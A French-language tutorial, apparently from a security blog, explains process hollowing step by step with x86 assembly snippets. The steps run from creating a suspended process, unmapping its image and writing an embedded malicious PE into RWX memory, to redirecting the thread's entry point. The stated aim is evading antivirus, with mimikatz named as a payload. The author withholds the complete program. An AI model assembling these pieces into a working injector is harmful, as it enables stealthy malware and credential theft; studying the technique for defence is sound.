
Cet article présente une technique d'injection de code qui s'appelle le __process hollowing__. 

Cette technique d'injection de code est très séduisante car elle permet d'exécuter du code en se faisant passer pour un processus légitime. L'astuce consiste à exécuter un processus legitime, que j'appelle __legit.exe__, dans un état suspendu. Le code de __legit.exe__ n'a donc pas été exécuté. Alors qu'il est dans un état supendu, j'enlève le code du-dit processus et je le remplace par le code de __malicious.exe__. J'ai donc une coquille de __legit.exe__ qui exécute en réalité __malicious.exe__.

Il faut noter que le chemin de l'exécutable légitime reste le même une fois qu'il a été **hollowed**, ce qui rend difficile de détecter ce type d'injection.

Cependant les étapes de mise en place du __process hollowing__ sont toujours les mêmes:

* Executer un programme légitime: svchost.exe, explorer.exe, ...

* Suspendre le processus (soit à l'exécution, soit après)

* enlever le code du processus

* ajouter une zone mémoire RWE et y injecter le code malveillant (mimikatz.exe, ...)

* Reprendre l'exécution du processus

Il existe de nombreux articles et repos Github traitant du __process hollowing__, mais tous (en tout cas tous ceux que j'ai pu consulter) spécifient que les programmes (legit.exe et malicious.exe) sont sur le système de fichier. L'intérêt pour un POC est suffisant, mais pas pour une attaque ... Il y a donc 3 fichiers pour le POC: 

* legit.exe qui est un exécutable totalement légitime

* malicious.exe qui est un exécutable malveillant

* process_holling.exe qui effectue l'injection de malicious.exe dans legit.exe

En pratique, il est évident que si __malicious.exe__ est sur le système de fichier et qu'il n'est pas détecté par l'anti-virus, il suffit de l'exécuter. Cependant, la réalité est telle que __malicious.exe__ est souvent détecté par les anti-virus. Il ne peut donc pas se trouver sur le système de fichier de la machine infectée.

L'étude que je présente ici ne contiendra que 2 fichiers:

* legit.exe

* process_hollowing.exe qui contiendra malicious.exe.

Quand je dis que __malicious.exe__ sera contenu dans __process_hollowing.exe__, c'est au sens litéral du terme. Je code __malicious.exe__, je l'ouvre avec un éditeur héxadécimal, je copie l'entiereté des opcodes que je vais insérer dans __process_hollowing.exe__. Oui, avec les headers !!!

Bien entendu, il faudra encoder ces opcodes si l'on souhaite exécuter __mimikatz__ de cette manière ^^

__Let's begin !__

Pour créer un processus dans un état suspendu, il suffit d'utiliser la fonction __CreateProcess()__ avec le **flags** __CREATE_SUSPENDED: 0x4__ de la manière suivante:

```
_createProcess:
	push		offset PrcInfo	; ProcessInformation
	push		offset SUInfo	; StartupInfo
	push		0		; CurrentDirectory
	push		0		; Environment
	push		4		; CreationFlags CREATE_SUSPENDED
	push		0		; InheritHandles
	push		0		; ThreadAttributes
	push		0		; ProcessAttributes
	
	push		offset PrcName	; ApplicationName
	push		0		; CommandLine
	call		CreateProcessA
```

Ici le programme légitime sera toujours le même que celui que j'utilise dans tout mes articles: __HxD__. Le code que j'écris ici sera en x86, il faut donc un programme légitime x86 ou wow64.

A noter que ce n'est pas vraiment le processus qui est dans un état suspendu, c'est son thread principal. Je rappelle qu'un processus ne sert que de support aux threads qui eux exécuteront du code. J'aurais donc pu d'abord créer mon "processus" dans un état non suspendu, puis utiliser la fonction __SuspendThread()__ afin de suspendre le thread principal. Cela fonctionne tout aussi bien.

Maintenant que mon thread est suspendu, il faut que je détermine les zones mémoire à laquelles les sections .text, .data ... ont été copiées afin de pouvoir les enlever. J'ai donc besoin de l'adresse de base à laquelle sont copiées les sections du processus distant. On va regarder du côté du __context__ pour cela.

Le __context__ du thread contient une zone mémoire de stockage privée pour les threads du processus et est appelée __TLS__ (Thread Local Storage). On verra dans un autre article comment l'utiliser pour exécuter du code avant l'__entry point__, mais aussi pour échanger des données entre les threads. Bref. Le __context__ contient également le contenu des registres, et c'est ça qui va nous interesser ! Il est possible de récupérer le __context__ d'un thread avec la fonction __GetThreadContext()__ comme suit:

```
_getThreadContext:
	mov		Context.ContextFlags, 10007h ; CONTEXT_FULL
	push		offset Context
	push		PrcInfo.hThread
	call		Wow64GetThreadContext
```

Entre parenthèse, pour trouver le handle du thread qui a été suspendu (pour utiliser __GetThreadContext()__), il faut regarder dans la strucuture __PROCESS\_INFORMATION__ (https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information)

Le context d'un thread suspendu contient dans eax, l'adresse de l'__entry point__, et dans ebx l'adresse du __PEB__ (Process Environment Block). La partie du __PEB__ qui nous intéresse est présentée ci-dessous:

![image alt text](/images/code-injection/peb_base_address.png)

On peut y voir l'adresse de base ! Elle n'est pas située à __PEB+0x0__, mais à __PEB+0x8__ !

Il faut donc que je lise la mémoire du processus suspendu (avec __ReadProcessMemory()__) à cette adresse, donc à l'adresse qui est située dans le  registre ebx du __context__, puis que j'y ajoute un offset de __0x8__. Cela me permettra de récupérer l'adresse de base que je devrais **unmapper** ensuite. Le code qui permet cela est:

```
_readProcessMemory:
	push		0			; *lpNumberOfBytesRead
	push		4			; nSize : sizeof(PVOID)
	push		offset baseAddressExe	; lpBuffer
	mov		ecx, Context.rEbx	; PEB
	add		ecx, 8
	push		ecx			; lpBaseAddress
	push		PrcInfo.hProcess 	; hProcess
	call		ReadProcessMemory
```

Je récupère l'adresse de base dans la variable __baseAddressExe__ qui me servira à enlever la mémoire du processus légitime. Pour faire cela, j'utilise la fonction non documentée __NtUnmapViewOfSection()__ présente dans __ntdll.dll__ comme suit:

```
_unmapViewOfSection:
	push		baseAddressExe
	push		PrcInfo.hProcess
	call		NtUnmapViewOfSection
```

On se retrouve alors avec un thread suspendu, et vide. C'est le début de l'aventure !

On va commencer par reserver de la place pour le binaire malveillant dans le processus légitime: 

* Mais combien de place? 

* A quelle adresse? 

* Est ce qu'on laisse le système choisir l'adresse où sera mappé notre exécutable?

Le binaire malveillant est sous forme d'opcodes contenus dans __process_hollowing.exe__. Il commence donc par __4D5A__ (MZ), n'est ce pas? Il faut savoir que __la taille du binaire sur disque n'est pas la taille de l'image du binaire chargée en mémoire !__ Par example, mon binaire peut faire 100 octets, si je définis que ma section .text fait 1000 octets, que ma section .data fait 1000 octets ... j'aurais donc en mémoire beaucoup plus que 100 octets (en l'occurence, au moins 2000 octets ..).

Pour connaitre la taille que fera le binaire en mémoire, il faut donc regarder la taille du code, mais aussi la taille des sections. Ou bien on peut regarder dans l'entête du binaire. Je vous montre ci-dessous que la taille de mon l'image fait 3000 octets alors que la taille de mon binaire sur disque fait 2000 octets. J'explique ensuite

![image alt text](/images/code-injection/sizeofimage.png)

La structure d'un binaire est composée de headers. Il y a tout d'abord le __DOS HEADER__ qui contient les membres suivant:

* e_magic : 5A4D -> MZ en little endien

* e_cblp

* c_cp

* ...

* e_lfanew

Cet entête est présente pour des raisons de compatibilité avec des anciens programmes, mais également pour faire le lien avec les nouveaux. Le membre qui nous intéresse alors est le dernier: __e\_lfanew__. Il permet de donner l'offset vers la prochaine section (nouvelle), comme on peut le voir sur la capture ci-dessous:

![image alt text](/images/code-injection/elfanew.png)

L'offset vers le header __NT_HEADERS__ est situé à l'offset __0xB0__ par rapport au début du fichier (__MZ__). Pour accéder à cette valeur, il faut regarder à l'offset __0x3C__ par rapport au début du fichier.

A partir de maintenant, tout les autres offsets qui seront donnés seront relatif à __e\_lfanew__, donc à l'offset __0xB0__. Sur la capture précédente présentant la taille de l'image, __SizeOfImage__, on a vu que ce membre était situé à l'offset __0x100__ par rapport à __MZ__. Ceci est important car si je regarde par example la taille de l'image de mimikatz, je trouverais: 

![image alt text](/images/code-injection/sizeofimage_mimi.png)

On y voit que cette fois-ci l'offset où se trouve __SizeOfImage__ n'est plus à __0x100__ mais à __0x168__ par rapport au début du programme. Dans mon code, je ne vais pas modifier tout mes offsets à chaque fois que j'insère un nouveau binaire malveillant. Par contre, ce qui est constant, c'est les offsets par rapport à __e\_lfanew__ et donc par rapport à __0xB0__, toujours. C'est la même chose pour les autres offsets des autres membres des autres headers.

Je sais donc que le membres __e\_lfanew__ va me servir de base pour calculer mes offsets et qu'il se trouve à l'offset __0x3C__ par rapport au début de mon fichier, je le récupère donc:

```
	lea 	eax, [payload+3Ch] ; DOS_HEADER.e_lfanew
	mov 	eax, [eax]
	mov 	[e_lfanew], eax    ; offset to NT_HEADER

payload:
	db 4DH, 5Ah, ....
	db ...
	db ...
endPayload:
```

Maintenant que j'ai l'offset de la section __NT_HEADER__, je peux retrouver l'offset de __SizeOfImage__ par rapport à __e\_lfanew__. Prenons l'example de mimikatz ci-dessus. La valeur de __e\_lfanew__ à l'offset __0xB0__ par rapport au début du fichier est de __0x118__ (pas présente sur les screenshots); l'offset de __SizeOfImage__ par rapport au début du fichier est __0x168__. On a donc un offset par rapport à __e\_lfanew__ de 0x168 - 0xB0 = __0x50__. Refaite la même chose pour l'autre binaire présenté et vous verrez que l'offset est aussi de __0x50__ !

Ainsi, pour avoir la taille de l'image du binaire malveillant:

```
	lea 	eax, [payload+3Ch] ; DOS_HEADER.e_lfanew
	mov 	eax, [eax]
	mov 	[e_lfanew], eax    ; offset to NT_HEADER

	mov 	ebx, [e_lfanew]
	lea	[payload+ebx+50h]  ; NT_HEADER.OPTIONAL_HEADER.SizeOfImage
	mov 	eax, [eax]         ; contient la taille de l'image !

payload:
	db 4DH, 5Ah, ....
	db ...
	db ...
endPayload:
```

Il reste ensuite à trouver une manière de déterminer à quelle adresse mettre en mémoire mon code malveillant. Je peux utiliser l'adresse de l'image de base si celle-ci n'est pas prise par le processus légitime. Sur les screenshots situés plus haut, on peut y voir le membre __ImageBase__ qui nous est utile. Essayez de calculer le bon offset par rapport à __e\_lfanew__ ^^ (réponse ci-dessous).

On peut donc allouer la zone mémoire (__VirtualAllocEx()__) dans le processus légitime comme il faut et avec la bonne taille:

```
_virtualAllocEx:
; allocate memory for  the executable image
	push		40h 		; PAGE_EXECUTE_READWRITE	; flProtect
	push		3000h 		; MEM_COMMIT or MEM_RESERVE		; flAllocationType

	mov 		ebx, [e_lfanew]
	lea 		eax, [payload+ebx+50h] ; NT_HEADER.OPTIONAL_HEADER.SizeOfImage
	mov 		eax, [eax]
	push		eax			; dwSize

	lea 		eax, [payload+ebx+34h] ; NT_HEADER.OPTIONAL_HEADER.ImageBase
	mov 		eax, [eax]
	push 		eax

	push		PrcInfo.hProcess
	call		VirtualAllocEx
```

On peut maintenant y copier du code. Je ne peux pas copier toute ma payload d'un coup. Comme on l'a vu plus, la taille de ma payload sur disque ne correspond pas à la taille de la paylod en mémoire pour des raisons notamment de taille de section. Il va donc falloir copier morceau par morceau. On commence par copier le header qui comprend:

* DOS_HEADER

* NT_HEADERS

* FILE_HEADER

* OPTIONAL_HEADER

* DATA_DIRECTORIES

Pour connaitre la taille des headers, il y a un membre dans __NT_HEADER.OPTIONAL_HEADER__ qui est __SizeOfHeaders__. Il est situé à l'offset __0x54__ par rapport à __e\_lfanew__ et il donne donc la taille à copier à partir du début du fichier. J'utilise la fonction __WriteProcessMemory()__ pour cela: 

```
_writeProcessMemory:
	push		0	 	 ; bytesWritten

	mov 		ebx, [e_lfanew]
	lea 		eax, [payload+ebx+54h] ; NT_HEADER.OPTIONAL_HEADER.SizeOfHeaders
	mov 		eax, [eax]
	push		eax 		 ; bytesToWrite

	push		payload  	 ; buffer
	push		mem 		 ; address from VirtualAllocEx
	push		PrcInfo.hProcess ; hProcess
	call		WriteProcessMemory 
```

On peut ensuite y écrire les sections:

* .text

* .data

* .reloc

* ...

On utilise pour cela la meme technique. A noter que dans le header __NT_HEADER.FILE_HEADER__, il y a le membre __NumberOfSections__ qui donne le nombre de section. Il suffit alors de boucler dessus.

Pour copier les sections correctements, il faut leur taille, leur adresse ... On peut les trouver grâce à des offsets encore une fois. Regardez le screenshot suivant:

![image alt text](/images/code-injection/sections.png)

Le code qui permet de copier les sections devrait maintenant être clair. Ce n'est qu'une question de calcul d'offsets par rapport à __e\lfanew__:

```
; now we have to write the remaining sections of the PE to the process
	mov		ecx, 0 ; counter
	
_loopToWriteRemainingSections:
	push		ecx ; save the counter on the stack

	mov		eax, sizeof(IMAGE_SECTION_HEADER)
	mul		ecx
	mov 		ebx, [e_lfanew]
	lea 		esi, [payload+ebx+0F8h] ; address of first section name: .text, .data
	add		esi, eax

	push		0
	mov 		ebx, [esi+10h] ; SECTION_HEADERS.SizeOfRawData
	push 		ebx

	mov 		ebx, [esi+14h] ; SECTION_HEADERS.PointerToRawData
	lea 		ebx, [payload+ebx]
	push 		ebx

	mov		ebx, mem
	add 		ebx, [esi+0Ch] ;SECTION_HEADERS.VirtualAddress
	push		ebx

	push		PrcInfo.hProcess
	call		WriteProcessMemory 
	
	pop		ecx ; restore the counter from the stack
	inc		ecx

	mov 		edi, [e_lfanew]
	lea 		edi, [payload+edi+6] ; FILE_HEADER.NumberOfSections
	xor 		edx, edx
	mov 		dx, [edi]
	cmp		ecx, edx
	jnz		_loopToWriteRemainingSections
	jmp		_BaseAddressPEB
```

Il ne reste pas grand chose à faire.

On a maintenant un processus légitime qui a été vidé puis remplacé par l'image d'un binaire malveillant. Il ne reste plus qu'à relancer le thread afin qu'il reprenne son cours normal d'exécution. Pas tout à fait ...

L'entry point du binaire malveillant à peu de chance d'être le même que celui du processus légitime, de même pour son adresse de base. Il va falloir agir en conséquence. On a vu au début de l'article que le __context__ d'un thread suspendu contenait dans son __PEB__ l'adresse de base. Il va falloir la modifier et y mettre l'adresse à laquelle le binaire malveillant a été chargé grâce à __VirtualAllocEx()__.

En ce qui concernant l'__entry point__, on a vu qu'il était situé dans __eax__. Il faut donc le modifier avec celui du binaire malveillant. Celui-ci est disponible dans le header __NT_HEADERS.OPTIONAL_HEADER__ dans le membre __AddressOfEntryPoint__ à l'offset __0x28__ par rapport à __e\_lfanew__. Le code suivant effectue cela: 

```
_newEntryPoint:
	mov		eax, mem
	mov 		ebx, [e_lfanew]
	lea 		ecx, [payload+ebx+28h] ; NT_HEADERS.OPTIONAL_HEADER.AddressOfEntryPoint
	add 		eax, [ecx]
	mov		Context.rEax, eax ; Set the eax register to the entry point of the injected image
```

Une fois que l'on a modifié le __context__ du processus légitime, il ne reste plus qu'à faire l'update grâce à la fonction __SetThreadContext()__ comme suit:

```
_setThreadContext:
	push		offset Context
	push		PrcInfo.hThread
	call		Wow64SetThreadContext
```

Et enfin de relancer le thread avec la fonction __Resumethread()__:

```
_resumeThread:
	push		PrcInfo.hThread	; resume the thread that is in a suspended state
	call		ResumeThread
```

Et voilà! J'espère que cet article aura été instructif :D

Pour des raisons évidentes, je ne posterai pas le code complet permettant de faire cette injection de code via __process hollowing__. En effet, après en avoir discuté rapidement avec un ami, il s'avère que ce code est dangereux. Les bouts de code que je vous ai fournis ne suffisent pas à refaire le programme au complet, mais vous donne les bases pour en comprendre le principe.

De plus, il y a quelques subtilités à bien saisir pour ceux qui souhaitent l'adapter en x64. Ce n'est pas insurmontable, il suffit d'avoir bien saisi l'ensemble des concepts et nuances présentées.

N'hésitez pas à me contacter si besoin.



